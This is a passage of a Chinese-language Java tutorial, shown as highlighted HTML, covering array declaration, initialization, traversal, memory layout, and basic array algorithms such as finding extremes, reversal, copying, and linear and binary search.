class="line">元素的数据类型[] 数组名;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//也对，但是不推荐</span></span><br><span class="line">元素的数据类型  数组名[];</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//要存储一组整数</span></span><br><span class="line"><span class="keyword">int</span>[] array;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要存储一组单字符</span></span><br><span class="line"><span class="keyword">char</span>[] array;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要存储一组字符串</span></span><br><span class="line">String[] array;</span><br></pre></td></tr></table></figure><h3 id="4-2-2-数组的初始化"><a href="#4-2-2-数组的初始化" class="headerlink" title="4.2.2 数组的初始化"></a>4.2.2 数组的初始化</h3><p>初始化的目的：（1）确定数组的长度（2）为元素赋值</p><p>两种初始化方式：</p><p>1、动态初始化</p><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定数组长度</span></span><br><span class="line">数组名 = <span class="keyword">new</span> 元素的数据类型[长度];</span><br><span class="line"></span><br><span class="line"><span class="comment">//为元素赋值</span></span><br><span class="line">数组名[下标] = 值; <span class="comment">//这个值可以是个常量值，也可以是个表达式的计算结果，也可以是键盘输入的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果每个元素的赋值比较有规律，通常使用for循环赋值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;长度; i++)&#123;</span><br><span class="line">    数组名[下标] = 值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>问：如果只指定数组长度，没有为元素手动赋值，那么元素有值吗？</p><p>有默认值</p><p>（1）基本数据类型</p><p>​    byte,short,int,long：0</p><p>​    float,double：0.0</p><p>​    char：\u0000</p><p>​    boolean：false</p><p>（2）引用数据类型</p><p>​    统统都是null</p></blockquote><p>2、静态初始化</p><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数组名 = <span class="keyword">new</span> 元素的数据类型[]&#123;值列表&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//int[] arr = new int[5]&#123;1,2,3,4,5&#125;;//错误的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//更简洁</span></span><br><span class="line"><span class="comment">//当声明与静态初始化一起完成时，可以简化</span></span><br><span class="line">元素的数据类型[] 数组名 = &#123;值列表&#125;;</span><br></pre></td></tr></table></figure><p>适用场合：</p><p>​    当数组的元素是已知的有限个时，可以使用静态初始化。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String[] weeks = &#123;<span class="string">"monday"</span>,<span class="string">"tuesday"</span>,<span class="string">"wednesday"</span>,<span class="string">"thursday"</span>,<span class="string">"friday"</span>,<span class="string">"saturday"</span>,<span class="string">"sunday"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>[] daysOfMonths = &#123;<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>[] letters = &#123;<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-3-数组的遍历"><a href="#4-2-3-数组的遍历" class="headerlink" title="4.2.3 数组的遍历"></a>4.2.3 数组的遍历</h3><p>for循环遍历数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;数组名.lenght; i++)&#123;</span><br><span class="line">    <span class="comment">//或赋值</span></span><br><span class="line">    数组名[i] = 值;</span><br><span class="line">    <span class="comment">//或显示</span></span><br><span class="line">    System.out.println(数组名[i])；</span><br><span class="line">    <span class="comment">//或其他操作</span></span><br><span class="line">    <span class="comment">//例如：判断是否是偶数</span></span><br><span class="line">    <span class="keyword">if</span>(数组名[i]%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-4-数组的内存分析"><a href="#4-2-4-数组的内存分析" class="headerlink" title="4.2.4 数组的内存分析"></a>4.2.4 数组的内存分析</h3><p>元素是基本数据类型的一维数组内存分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int[] arr = &#123;1,2,3,4,5&#125;;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1558400311779.png" alt="1558400311779" title>                </div>                <div class="image-caption">1558400311779</div>            </figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    arr[i] = i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1558400323314.png" alt="1558400323314" title>                </div>                <div class="image-caption">1558400323314</div>            </figure><h2 id="4-3-数组的相关算法"><a href="#4-3-数组的相关算法" class="headerlink" title="4.3 数组的相关算法"></a>4.3 数组的相关算法</h2><h3 id="4-3-1-数组找最值"><a href="#4-3-1-数组找最值" class="headerlink" title="4.3.1 数组找最值"></a>4.3.1 数组找最值</h3><p>1、数组中找最值</p><p>思路：</p><p>（1）先假设第一个元素最大/最小</p><p>（2）然后用max/min与后面的元素一一比较</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">//找最大值</span></span><br><span class="line"><span class="keyword">int</span> max = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] &gt; max)&#123;</span><br><span class="line">        max = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、数组中找最值及其下标</p><p>情况一：找最值及其第一次出现的下标</p><p>思路：</p><p>（1）先假设第一个元素最大/最小</p><p>（2）然后用max/min与后面的元素一一比较</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">//找最大值</span></span><br><span class="line"><span class="keyword">int</span> max = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] &gt; max)&#123;</span><br><span class="line">        max = arr[i];</span><br><span class="line">        index = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">//找最大值</span></span><br><span class="line"><span class="keyword">int</span> maxIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] &gt; arr[maxIndex])&#123;</span><br><span class="line">        maxIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"最大值："</span> + arr[maxIndex]);</span><br></pre></td></tr></table></figure><p>情况二：找最值及其所有最值的下标（即可能最大值重复）</p><p>思路：</p><p>（1）先找最大值</p><p>①假设第一个元素最大</p><p>②用max与后面的元素一一比较</p><p>（2）遍历数组，看哪些元素和最大值是一样的</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">//找最大值</span></span><br><span class="line"><span class="keyword">int</span> max = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] &gt; max)&#123;</span><br><span class="line">        max = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历数组，看哪些元素和最大值是一样的</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(max == arr[i])&#123;</span><br><span class="line">        System.out.print(i+<span class="string">"\t"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-2-数组统计：求总和、均值、统计偶数个数等"><a href="#4-3-2-数组统计：求总和、均值、统计偶数个数等" class="headerlink" title="4.3.2 数组统计：求总和、均值、统计偶数个数等"></a>4.3.2 数组统计：求总和、均值、统计偶数个数等</h3><p>思路：遍历数组，挨个的累加，判断每一个元素</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">//求总和、均值</span></span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;<span class="comment">//因为0加上任何数都不影响结果</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    sum += arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">double</span> avg = (<span class="keyword">double</span>)sum/arr.length;</span><br></pre></td></tr></table></figure><p>示例代码2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求总乘积</span></span><br><span class="line"><span class="keyword">long</span> result = <span class="number">1</span>;<span class="comment">//因为1乘以任何数都不影响结果</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    result *= arr[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码3：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">//统计偶数个数</span></span><br><span class="line"><span class="keyword">int</span> even = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i]%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        even++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-反转"><a href="#4-3-3-反转" class="headerlink" title="4.3.3 反转"></a>4.3.3 反转</h3><p>方法有两种：</p><p>1、借助一个新数组</p><p>2、首尾对应位置交换</p><p>第一种方式示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(1)先创建一个新数组</span></span><br><span class="line"><span class="keyword">int</span>[] newArr = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)复制元素</span></span><br><span class="line"><span class="keyword">int</span> len = arr.length;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;newArr.length; i++)&#123;</span><br><span class="line">    newArr[i] = arr[len -<span class="number">1</span> - i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)舍弃旧的，让arr指向新数组</span></span><br><span class="line">arr = newArr;<span class="comment">//这里把新数组的首地址赋值给了arr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)遍历显示</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    System.out.println(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种方式示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(1)计算要交换的次数：  次数 = arr.length/2</span></span><br><span class="line"><span class="comment">//(2)首尾交换</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length/<span class="number">2</span>; i++)&#123;<span class="comment">//循环的次数就是交换的次数</span></span><br><span class="line">    <span class="comment">//首  与  尾交换</span></span><br><span class="line">    <span class="keyword">int</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[arr.length-<span class="number">1</span>-i];</span><br><span class="line">arr[arr.length-<span class="number">1</span>-i] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//（3）遍历显示</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    System.out.println(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-4-复制"><a href="#4-3-4-复制" class="headerlink" title="4.3.4 复制"></a>4.3.4 复制</h3><p>应用场景：</p><p>1、扩容</p><p>2、备份</p><p>3、截取</p><p>示例代码：扩容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果要把arr数组扩容，增加1个位置</span></span><br><span class="line"><span class="comment">//(1)先创建一个新数组，它的长度 = 旧数组的长度+1</span></span><br><span class="line"><span class="keyword">int</span>[] newArr = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)复制元素</span></span><br><span class="line"><span class="comment">//注意：i&lt;arr.length   因位arr比newArr短，避免下标越界</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    newArr[i] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)把新元素添加到newArr的最后</span></span><br><span class="line">newArr[newArr.length-<span class="number">1</span>] = 新值;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)如果下面继续使用arr，可以让arr指向新数组</span></span><br><span class="line">arr = newArr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)遍历显示</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    System.out.println(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：备份</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、创建一个长度和原来的数组一样的新数组</span></span><br><span class="line"><span class="keyword">int</span>[] newArr = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、复制元素</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    newArr[i] = arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、遍历显示</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    System.out.println(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：截取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> start = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> end = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、创建一个新数组，新数组的长度 = end-start + 1;</span></span><br><span class="line"><span class="keyword">int</span>[] newArr = <span class="keyword">new</span> <span class="keyword">int</span>[end-start+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、赋值元素</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;newArr.length; i++)&#123;</span><br><span class="line">    newArr[i] = arr[start + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、遍历显示</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;newArr.length; i++)&#123;</span><br><span class="line">    System.out.println(newArr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-5-查找"><a href="#4-3-5-查找" class="headerlink" title="4.3.5 查找"></a>4.3.5 查找</h3><p>查找分为两种：</p><p>1、顺序查找：挨个看</p><p>​    对数组没要求</p><p>2、二分查找：对折对折再对折</p><p>​    对数组有要求，元素必须有大小顺序的</p><p>顺序查找示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> value = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> index = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] == value)&#123;</span><br><span class="line">        index = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(index==-<span class="number">1</span>)&#123;</span><br><span class="line">    System.out.println(value + <span class="string">"不存在"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    System.out.println(value + <span class="string">"的下标是"</span> + index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二分查找示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2、编写代码，使用二分查找法在数组中查找 int value = 2;是否存在，如果存在显示下标，不存在显示不存在。</span></span><br><span class="line"><span class="comment">已知数组：int[] arr = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exam2</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;<span class="comment">//数组是有序的</span></span><br><span class="line"><span class="keyword">int</span> value = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="comment">//找到结束</span></span><br><span class="line">            <span class="keyword">if</span>(value == arr[mid])&#123;</span><br><span class="line">                index = mid;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="comment">//没找到</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(value &gt; arr[mid])&#123;<span class="comment">//往右继续查找</span></span><br><span class="line">                <span class="comment">//移动左边界，使得mid往右移动</span></span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(value &lt; arr[mid])&#123;<span class="comment">//往左边继续查找</span></span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            mid = (left + right)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(index==-<span 